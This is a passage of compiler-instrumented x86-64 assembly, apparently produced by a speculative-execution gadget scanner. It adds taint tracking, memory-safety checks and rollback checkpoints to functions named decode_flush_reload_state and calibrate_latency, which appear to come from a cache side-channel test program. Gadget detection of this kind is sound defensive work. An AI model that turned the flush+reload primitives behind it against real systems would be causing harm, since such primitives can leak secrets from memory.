            je .L__asan_check_fail_non_attacker__teapot___307
.L__asan_check_fail_attacker__teapot___307:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rbx,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $2,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___307
.L__asan_check_fail_non_attacker__teapot___307:

            orb $2,(dift_reg_queued_tag)
            movb $2,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___307:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq (%rsi,%rax,8),%rax
            btcq $45,%rax
            xorl %ecx,%ecx
            orb (dift_reg_tags),%cl
            orb (dift_reg_tags+4),%cl
            orb (%rax),%cl
            movb %cl,(dift_reg_tags+2)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___308

            movb (dift_reg_queued_tag),%cl
            movzbq (dift_reg_queued_id),%rbx
            orb %cl,(dift_reg_tags)(%rbx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___308:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq (%rsi,%rax,8),%rcx
            movq %rax,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags+2),%al
            orb (dift_reg_tags+1),%al
            testb $48,%al
            je .L__check_ok__teapot___309

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___309:

            nop
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $3,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            cmpq %rbx,%rcx
            movq %rax,(scratchpad)
            leaq (.__trampoline__d4b3ab72_cc21_4c54_a149_64390f6b9b56__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___311)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__d4b3ab72_cc21_4c54_a149_64390f6b9b56__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___311:

            nop
            jbe .L_14fb__teapot__
.L__trampoline_target__408d6aab_a42b_4c3b_b93f_7b82a0db8f58__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $9,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %r13d,%r13d
            orb (dift_reg_tags+7),%r13b
            movb %r13b,(dift_reg_tags+12)
.L__dift_done__teapot___313:

            nop
            movl %ebp,%r12d
            xorl %ebp,%ebp
            orb (dift_reg_tags),%bpl
            movb %bpl,(dift_reg_tags+7)
.L__dift_done__teapot___314:

            nop
            movl %eax,%ebp
            movq %rax,(scratchpad+524288)
            xorl %r13d,%r13d
            orb (dift_reg_tags+1),%r13b
            movb %r13b,(dift_reg_tags+13)
.L__dift_done__teapot___315:

            nop
            movq (scratchpad+524288),%rax
            movq %rbx,%r13
            movq %rax,(scratchpad+524288)
            xorl %ebx,%ebx
            orb (dift_reg_tags+2),%bl
            movb %bl,(dift_reg_tags+1)
.L__dift_done__teapot___316:

            nop
            movq (scratchpad+524288),%rax
            movq %rcx,%rbx
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $5,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            jmp .L_14fb__teapot__
.L_1522__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $5,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %r13d,%r13d
            movb %r13b,(dift_reg_tags+12)
.L__dift_done__teapot___319:

            nop
            movl $0,%r12d
            xorl %ebp,%ebp
            movb %bpl,(dift_reg_tags+7)
.L__dift_done__teapot___320:

            nop
            movl $0,%ebp
            xorl %ebx,%ebx
            movb %bl,(dift_reg_tags+13)
.L__dift_done__teapot___321:

            nop
            movl $0,%r13d
            movq %rax,(scratchpad+524288)
            xorl %ebx,%ebx
            movb %bl,(dift_reg_tags+1)
.L__dift_done__teapot___322:

            nop
            movq (scratchpad+524288),%rax
            movq (instruction_cnt),%rbx
            addq $4,%rbx
            cmpq $250,%rbx
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rbx,(instruction_cnt)
            movl $0,%ebx
.L_1538__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $2,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            callq __ctype_b_loc@PLT
.L__ret_transform_target_decode_flush_reload_state__a9c7d194_ecf9_48f8_984c_fcdf38c0c0f4__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $1,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %edx,%edx
            orb (dift_reg_tags+7),%dl
            movb %dl,(dift_reg_tags+2)
.L__dift_done__teapot___328:

            nop
            movzbl %bpl,%ecx
            leaq (%rax),%rdx
            xorq %rsi,%rsi
            orb (dift_reg_tags),%sil
            testb $48,%sil
            je .L__attacker_tags_check__teapot___329

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rdx,%rsi
            movq (scratchpad),%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___329:

            testb $2,%sil
            je .L__asan_check__teapot___329

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rdx,%rsi
            movq (scratchpad),%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $3,(dift_reg_queued_id)
.L__asan_check__teapot___329:

            movq %rdx,%r8
            shrq $3,%r8
            movb 2147450880(%r8),%r8b
            testb %r8b,%r8b
            je .L__mem_operand_policy_done__teapot___329
.L__asan_check_fail__teapot___329:

            testb $1,%sil
            je .L__asan_check_fail_non_attacker__teapot___329
.L__asan_check_fail_attacker__teapot___329:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rdx,%rsi
            movq (scratchpad),%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $3,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___329
.L__asan_check_fail_non_attacker__teapot___329:

            orb $2,(dift_reg_queued_tag)
            movb $3,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___329:

            nop
            leaq (%rax),%rsi
            btcq $45,%rsi
            xorl %r8d,%r8d
            orb (dift_reg_tags),%r8b
            orb (%rsi),%r8b
            movb %r8b,(dift_reg_tags+3)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___330

            movb (dift_reg_queued_tag),%r8b
            movzbq (dift_reg_queued_id),%rdx
            orb %r8b,(dift_reg_tags)(%rdx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___330:

            nop
            movq (%rax),%rdx
            testb $64,1(%rdx,%rcx,2)
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %edx,%edx
            movb %dl,(dift_reg_tags+3)
.L__dift_done__teapot___331:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl $63,%edx
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            je .L__dift_doit__teapot___332

            jmp .L__dift_done__teapot___332
.L__dift_doit__teapot___332:

            xorl %r8d,%r8d
            orb (dift_reg_tags+3),%r8b
            movb %r8b,(dift_reg_tags+7)
.L__dift_done__teapot___332:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            cmovel %edx,%ebp
            xorl %r9d,%r9d
            orb (dift_reg_tags+7),%r9b
            orb (dift_reg_tags+14),%r9b
            leaq (%r14),%rdx
            btcq $45,%rdx
            movq (memory_history_top),%rsi
            movq (%rdx),%r8
            movq %rdx,(%rsi)
            movq %r8,8(%rsi)
            leaq 16(%rsi),%rsi
            movq %rsi,(memory_history_top)
            movb %r9b,(%rdx)
            addq $8,%rdx
.L__dift_done__teapot___333:

            nop
            leaq (%r14),%rdx
            movq (memory_history_top),%rsi
            movq (%rdx),%r8
            movq %rdx,(%rsi)
            movq %r8,8(%rsi)
            leaq 16(%rsi),%rsi
            movq %rsi,(memory_history_top)
            movb %bpl,(%r14)
            xorl %r14d,%r14d
            orb (dift_reg_tags+12),%r14b
            movb %r14b,(dift_reg_tags+3)
.L__dift_done__teapot___335:

            nop
            movzbl %r12b,%edx
            leaq (%rax),%r14
            xorq %rsi,%rsi
            orb (dift_reg_tags),%sil
            testb $48,%sil
            je .L__attacker_tags_check__teapot___336

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r14,%rsi
            movq (scratchpad),%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___336:

            testb $2,%sil
            je .L__asan_check__teapot___336

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r14,%rsi
            movq (scratchpad),%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__asan_check__teapot___336:

            movq %r14,%r8
            shrq $3,%r8
            movb 2147450880(%r8),%r8b
            testb %r8b,%r8b
            je .L__mem_operand_policy_done__teapot___336
.L__asan_check_fail__teapot___336:

            testb $1,%sil
            je .L__asan_check_fail_non_attacker__teapot___336
.L__asan_check_fail_attacker__teapot___336:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r14,%rsi
            movq (scratchpad),%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___336
.L__asan_check_fail_non_attacker__teapot___336:

            orb $2,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___336:

            nop
            leaq (%rax),%rsi
            btcq $45,%rsi
            xorl %r8d,%r8d
            orb (dift_reg_tags),%r8b
            orb (%rsi),%r8b
            movb %r8b,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___337

            movb (dift_reg_queued_tag),%r8b
            movzbq (dift_reg_queued_id),%r14
            orb %r8b,(dift_reg_tags)(%r14)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___337:

            nop
            movq (%rax),%rax
            testb $64,1(%rax,%rdx,2)
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %r14d,%r14d
            movb %r14b,(dift_reg_tags+9)
.L__dift_done__teapot___338:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl $63,%r9d
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            jne .L__dift_doit__teapot___339

            jmp .L__dift_done__teapot___339
.L__dift_doit__teapot___339:

            xorl %r14d,%r14d
            orb (dift_reg_tags+12),%r14b
            movb %r14b,(dift_reg_tags+9)
.L__dift_done__teapot___339:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            cmovnel %r12d,%r9d
            xorl %r14d,%r14d
            orb (dift_reg_tags+7),%r14b
            movb %r14b,(dift_reg_tags+3)
.L__dift_done__teapot___340:

            nop
            movsbl %bpl,%edx
            xorl %ebp,%ebp
            orb (dift_reg_tags+13),%bpl
            leaq -8(%rsp),%r14
            btcq $45,%r14
            movabsq $72340172838076673,%r8
            imulq %r8,%rbp
            movq (memory_history_top),%rsi
            movq (%r14),%r8
            movq %r14,(%rsi)
            movq %r8,8(%rsi)
            leaq 16(%rsi),%rsi
            movq %rsi,(memory_history_top)
            movq %rbp,(%r14)
            addq $8,%r14
.L__dift_done__teapot___341:

            nop
            leaq -8(%rsp),%r14
            movq (memory_history_top),%rsi
            movq (%r14),%r8
            movq %r14,(%rsi)
            movq %r8,8(%rsi)
            leaq 16(%rsi),%rsi
            movq %rsi,(memory_history_top)
            pushq %r13
            movzbl %r12b,%r12d
            xorl %r8d,%r8d
            orb (dift_reg_tags+12),%r8b
            leaq -8(%rsp),%r14
            btcq $45,%r14
            movabsq $72340172838076673,%r13
            imulq %r13,%r8
            movq (memory_history_top),%rsi
            movq (%r14),%r13
            movq %r14,(%rsi)
            movq %r13,8(%rsi)
            leaq 16(%rsi),%rsi
            movq %rsi,(memory_history_top)
            movq %r8,(%r14)
            addq $8,%r14
.L__dift_done__teapot___343:

            nop
            leaq -8(%rsp),%r14
            movq (memory_history_top),%rsi
            movq (%r14),%r13
            movq %r14,(%rsi)
            movq %r13,8(%rsi)
            leaq 16(%rsi),%rsi
            movq %rsi,(memory_history_top)
            pushq %r12
            movsbl %r9b,%r9d
            xorl %esi,%esi
            orb (dift_reg_tags+1),%sil
            movb %sil,(dift_reg_tags+8)
.L__dift_done__teapot___345:

            nop
            movq %rbx,%r8
            xorl %esi,%esi
            orb (dift_reg_tags+3),%sil
            movb %sil,(dift_reg_tags+2)
.L__dift_done__teapot___346:

            nop
            movl %edx,%ecx
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___347:

            nop
            leaq (.L_2090)(%rip),%rsi
            xorl %r14d,%r14d
            movb %r14b,(dift_reg_tags+5)
.L__dift_done__teapot___348:

            nop
            movl $1,%edi
            xorl %r14d,%r14d
            movb %r14b,(dift_reg_tags)
.L__dift_done__teapot___349:

            nop
            movl $0,%eax
            leaq -8(%rsp),%r14
            movq (memory_history_top),%r12
            movq (%r14),%r13
            movq %r14,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq __printf_chk__dift_wrapper__@PLT
.L__ret_transform_target_decode_flush_reload_state__e44c6f8e_8353_470d_989c_137d422c6558__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $4,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            addq $16,%rsp
            leaq (%rsp),%r12
            btcq $45,%r12
            xorl %r13d,%r13d
            orb (%r12),%r13b
            movb %r13b,(dift_reg_tags+1)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___353

            movb (dift_reg_queued_tag),%r13b
            movzbq (dift_reg_queued_id),%r14
            orb %r13b,(dift_reg_tags)(%r14)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___353:

            nop
            popq %rbx
            leaq (%rsp),%r12
            btcq $45,%r12
            xorl %ebp,%ebp
            orb (%r12),%bpl
            movb %bpl,(dift_reg_tags+7)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___354

            movb (dift_reg_queued_tag),%bpl
            movzbq (dift_reg_queued_id),%r13
            orb %bpl,(dift_reg_tags)(%r13)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___354:

            nop
            popq %rbp
            leaq (%rsp),%r12
            btcq $45,%r12
            xorl %r14d,%r14d
            orb (%r12),%r14b
            movb %r14b,(dift_reg_tags+12)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___355

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r13
            orb %r14b,(dift_reg_tags)(%r13)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___355:

            nop
            popq %r12
            movq %rax,(scratchpad+524288)
            leaq (%rsp),%rax
            btcq $45,%rax
            xorl %r14d,%r14d
            orb (%rax),%r14b
            movb %r14b,(dift_reg_tags+13)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___356

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r13
            orb %r14b,(dift_reg_tags)(%r13)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___356:

            nop
            movq (scratchpad+524288),%rax
            popq %r13
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq (%rsp),%rax
            btcq $45,%rax
            xorl %r14d,%r14d
            orb (%rax),%r14b
            movb %r14b,(dift_reg_tags+14)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___357

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%rbx
            orb %r14b,(dift_reg_tags)(%rbx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___357:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            popq %r14
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $7,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___360

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___360:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.size decode_flush_reload_state__teapot__, . - decode_flush_reload_state__teapot__
calibrate_latency__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rdi
            movq %rbx,(%rax)
            movq %rdi,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $255,(%rbx)
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $74,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            xorl %edi,%edi
            orb (dift_reg_tags+7),%dil
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rdi
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rdi,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___363:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rdi
            movq %rbx,(%rax)
            movq %rdi,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            pushq %rbp
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            xorl %edi,%edi
            orb (dift_reg_tags+1),%dil
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rbp
            imulq %rbp,%rdi
            movq (memory_history_top),%rax
            movq (%rbx),%rbp
            movq %rbx,(%rax)
            movq %rbp,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rdi,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___365:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            leaq -8(%rsp),%rbp
            movq (memory_history_top),%rax
            movq (%rbp),%rdi
            movq %rbp,(%rax)
            movq %rdi,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524288),%rax
            pushq %rbx
            subq $8,%rsp
            xorl %edi,%edi
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___367:

            nop
            movl $8,%edi
            movq %rax,(scratchpad+524288)
            leaq -8(%rsp),%rbp
            movq (memory_history_top),%rax
            movq (%rbp),%rbx
            movq %rbp,(%rax)
            movq %rbx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            callq malloc@PLT
.L__ret_transform_target_calibrate_latency__b6db33d9_25b0_444c_b7e4_fcaaf5fd8af1__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $76,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %esi,%esi
            orb (dift_reg_tags),%sil
            orb (dift_reg_tags),%sil
            testb $48,%sil
            je .L__check_ok__teapot___371

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq (scratchpad),%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___371:

            nop
            movq (instruction_cnt),%rsi
            addq $2,%rsi
            cmpq $250,%rsi
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rsi,(instruction_cnt)
            testq %rax,%rax
            leaq (.__trampoline__66ed920a_c1ea_40bd_9954_18d11801e056__teapot__)(%rip),%rsi
            movq %rsi,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___373)(%rip),%rsi
            movq %rsi,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__66ed920a_c1ea_40bd_9954_18d11801e056__teapot__)(%rip),%rsi
            movq %rsi,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___373:

            nop
            je .L_16b7__teapot__
.L__trampoline_target__3b32d92d_788c_43bb_91b0_38668d75dda3__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $73,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %edx,%edx
            orb (dift_reg_tags),%dl
            movb %dl,(dift_reg_tags+1)
.L__dift_done__teapot___375:

            nop
            movq %rax,%rbx
            leaq (%rbx),%rdx
            xorq %rsi,%rsi
            orb (dift_reg_tags+1),%sil
            testb $48,%sil
            je .L__attacker_tags_check__teapot___376

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rdx,%rsi
            movq (scratchpad),%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___376:

            testb $2,%sil
            je .L__asan_check__teapot___376

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rdx,%rsi
            movq (scratchpad),%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__asan_check__teapot___376:

            movq %rdx,%r8
            shrq $3,%r8
            movb 2147450880(%r8),%r8b
            testb %r8b,%r8b
            je .L__mem_operand_policy_done__teapot___376

            movb %dl,%bpl
            andb $7,%bpl
            cmpb %r8b,%bpl
            jl .L__mem_operand_policy_done__teapot___376
.L__asan_check_fail__teapot___376:

            testb $1,%sil
            je .L__asan_check_fail_non_attacker__teapot___376
.L__asan_check_fail_attacker__teapot___376:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rdx,%rsi
            movq (scratchpad),%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___376
.L__asan_check_fail_non_attacker__teapot___376:

            orb $2,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___376:

            nop
            leaq (%rbx),%rsi
            btcq $45,%rsi
            xorl %r8d,%r8d
            orb (dift_reg_tags+1),%r8b
            orb (%rsi),%r8b
            movb %r8b,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___377

            movb (dift_reg_queued_tag),%r8b
            movzbq (dift_reg_queued_id),%rdx
            orb %r8b,(dift_reg_tags)(%rdx)
